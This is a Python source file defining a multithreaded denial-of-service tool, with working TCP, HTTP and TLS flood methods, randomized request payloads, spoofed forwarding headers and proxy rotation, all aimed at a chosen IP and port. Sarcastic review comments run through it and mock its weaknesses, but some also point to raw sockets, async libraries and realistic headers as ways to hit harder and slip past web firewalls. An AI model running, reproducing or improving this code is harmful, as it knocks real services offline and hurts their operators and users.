import threading
import socket
import time
import random
from datetime import datetime
from typing import Dict, List
import requests
import ssl

class AdvancedDDoSAttacker:
    # "Advanced" is a stretch. This is like calling a tricycle a "high-performance vehicle"
    def __init__(self, target_ip: str, target_port: int, threads: int = 2000):
        self.target_ip = target_ip  # No validation? What if I pass "localhost" or "127.0.0.1"? Congrats, you played yourself
        self.target_port = target_port  # No port validation either? Port 0 is totally valid, right? (it's not)
        self.threads = min(max(threads, 1), 10000)  # 10,000 threads? Your CPU is sweating just thinking about it
        self.is_attacking = False
        self.attack_threads = []
        self.user_agents = self._load_user_agents()  # 5 whole user agents! So diverse! /s
        self.proxies = self._load_proxies()  # Proxies that probably don't work or are honeypots
        self.stats = {
            'start_time': None,
            'total_requests': 0,
            'success_requests': 0,
            'failed_requests': 0,
            'bandwidth_used': 0
        }
        self._lock = threading.Lock()  # At least you're using a lock. One point for thread safety
        self._stop_event = threading.Event()  # And an event for stopping. Two points!

    def _load_user_agents(self) -> List[str]:
        """Load diverse user agents"""
        # "Diverse" = 5 generic strings that any WAF will flag immediately
        # Bro, there are entire libraries and datasets for realistic user agents
        # This is like trying to disguise yourself with a fake mustache from the dollar store
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',  # No browser version? Super realistic
            'Mozilla/5.0 (Linux; Android 10; SM-G980F)',  # Half a user agent is better than none?
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3)',  # Same energy as "how do you do, fellow kids"
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0)',  # IE? In 2025? Not suspicious at all
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'  # Again, no browser. Super stealthy
        ]

    def _load_proxies(self) -> List[str]:
        """Load proxies from file if available"""
        try:
            with open('proxies.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            # Bare except again. What if the file exists but has wrong permissions?
            # Different errors tell you different things, but you'll never know
            return []

    def _update_stats(self, success: bool, bytes_sent: int = 0) -> None:
        """Thread-safe stats updating"""
        # This is actually decent. Thread safety with a lock. Good job!
        # But why not track response time? Or status codes? Or anything useful?
        with self._lock:
            self.stats['total_requests'] += 1
            self.stats['bandwidth_used'] += bytes_sent
            if success:
                self.stats['success_requests'] += 1
            else:
                self.stats['failed_requests'] += 1

    def _generate_random_payload(self) -> bytes:
        """Generate random HTTP payload"""
        # This is the HTTP equivalent of a kid saying random words to sound smart
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD']  # OPTIONS and PATCH exist too, ya know
        paths = ['/', '/wp-admin', '/api/v1', '/search', '/login']  # Super generic paths
        params = ['?q='+str(random.randint(1,10000)),  # Random numbers, so sneaky
                 '?id='+str(random.randint(100,999)),  # 3-digit IDs, very realistic
                 '?search='+random.choice(['test','admin','debug'])]  # Nothing says "legit traffic" like searching for "debug"
        
        # This payload is missing so many headers that real browsers send
        # Any decent WAF will flag this as bot traffic immediately
        payload = (f"{random.choice(methods)} {random.choice(paths)}{random.choice(params)} HTTP/1.1\r\n"
                  f"Host: {self.target_ip}\r\n"  # Host should be a domain, not an IP in most cases
                  f"User-Agent: {random.choice(self.user_agents)}\r\n"
                  f"Accept: */*\r\n"  # Real browsers have specific accept headers
                  f"Connection: keep-alive\r\n"
                  f"X-Forwarded-For: {'.'.join(str(random.randint(1,255)) for _ in range(4))}\r\n\r\n")  # Random IPs, so clever
        
        return payload.encode()

    def _syn_flood(self) -> None:
        """Enhanced SYN flood with socket reuse"""
        # This is NOT a SYN flood. Not even close.
        # A real SYN flood never completes the TCP handshake
        # This is just a regular TCP connection that sends HTTP data
        # It's like calling a water gun a "nuclear weapon"
        while not self._stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))  # This completes the handshake. SYN floods don't do this
                
                # Send multiple packets per connection
                for _ in range(random.randint(3,10)):
                    payload = self._generate_random_payload()
                    s.sendall(payload)  # Sending HTTP payloads? In a "SYN flood"? That's not how this works
                    self._update_stats(True, len(payload))
                    time.sleep(random.uniform(0.1, 0.5))  # Sleeping during an attack? That'll show 'em!
                
                s.close()  # Politely closing the connection. So devastating!
            except Exception as e:
                # At least specify the exception type in the comment
                # Could be connection refused, timeout, DNS failure...
                self._update_stats(False)
                time.sleep(0.1)  # More sleeping. Your attack is narcoleptic

    def _http_flood(self) -> None:
        """Advanced HTTP flood with keep-alive"""
        # Using the requests library for a DDoS? That's like bringing a spoon to a gunfight
        # requests is synchronous and has tons of overhead
        # Real HTTP floods use raw sockets or async libraries like aiohttp
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',  # No real browser uses this
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        while not self._stop_event.is_set():
            try:
                # Use proxy if available
                proxy = {'http': random.choice(self.proxies)} if self.proxies else None
                # Most free proxies are slower than direct connections
                # You're basically rate-limiting yourself
                
                # Randomize request types
                if random.choice([True, False]):  # 50/50 chance, so sophisticated
                    response = requests.get(
                        f"http://{self.target_ip}:{self.target_port}",
                        headers=headers,
                        proxies=proxy,
                        timeout=5  # 5 second timeout? That's an eternity in DDoS time
                    )
                else:
                    response = requests.post(
                        f"http://{self.target_ip}:{self.target_port}",
                        headers=headers,
                        data=random._urandom(1024),  # Using a private method (_urandom)? That's bad practice
                        proxies=proxy,
                        timeout=5
                    )
                
                self._update_stats(True, len(response.content))
            except:
                # Bare except again. What if the error is on your end?
                # You'll never know because you're catching everything
                self._update_stats(False)

    def _ssl_flood(self) -> None:
        """HTTPS flood attack"""
        # This is just the SYN flood with SSL. Same problems, just slower
        context = ssl.create_default_context()
        context.check_hostname = False  # At least you disabled cert verification
        context.verify_mode = ssl.CERT_NONE
        
        while not self._stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                ssock = context.wrap_socket(s, server_hostname=self.target_ip)  # Using IP as hostname? That'll fail for most servers
                
                for _ in range(random.randint(3,7)):
                    payload = self._generate_random_payload()
                    ssock.sendall(payload)
                    self._update_stats(True, len(payload))
                    time.sleep(random.uniform(0.1, 0.3))  # More sleeping. Your attack has narcolepsy
                
                ssock.close()  # Politely closing connections again
            except:
                # Third bare except. It's like you're collecting them
                self._update_stats(False)

    def start_attack(self, attack_type: str = "syn") -> None:
        """Start enhanced attack"""
        # Finally, some decent code. The dictionary lookup for attack methods is good
        if self.is_attacking:
            return

        self._stop_event.clear()
        self.is_attacking = True
        self.stats = {
            'start_time': datetime.now(),
            'total_requests': 0,
            'success_requests': 0,
            'failed_requests': 0,
            'bandwidth_used': 0
        }

        attack_method = {
            'syn': self._syn_flood,  # Not a SYN flood
            'http': self._http_flood,  # Inefficient HTTP flood
            'ssl': self._ssl_flood  # Inefficient SSL flood
        }.get(attack_type.lower(), self._syn_flood)

        # Start attack threads
        for _ in range(self.threads):
            t = threading.Thread(target=attack_method)
            t.daemon = True  # At least you made them daemon threads
            t.start()
            self.attack_threads.append(t)

    def stop_attack(self) -> Dict:
        """Stop attack and return final stats"""
        # This is actually decent. Setting the event and joining threads
        self._stop_event.set()
        self.is_attacking = False

        for t in self.attack_threads:
            t.join(timeout=1)  # Good timeout on join

        duration = datetime.now() - self.stats['start_time']
        self.stats['duration'] = str(duration)  # Why convert to string? Keep it as a timedelta
        self.stats['requests_per_sec'] = self.stats['total_requests'] / max(duration.total_seconds(), 1)
        self.stats['bandwidth_mb'] = self.stats['bandwidth_used'] / (1024 * 1024)

        return self.stats

# In conclusion:
# 1. Your "SYN flood" isn't a SYN flood at all
# 2. Your HTTP flood uses the requests library, which is like bringing a knife to a tank battle
# 3. You're sleeping during the attack, giving the target time to recover
# 4. Your user agents are so generic they might as well be "HELLO I AM A HACKER"
# 5. You're catching all exceptions with bare excepts, so you have no idea what's failing
# 6. You're using 10,000 threads, which will probably crash your own machine before the target
#
# But hey, at least you have thread safety and a nice stats tracker!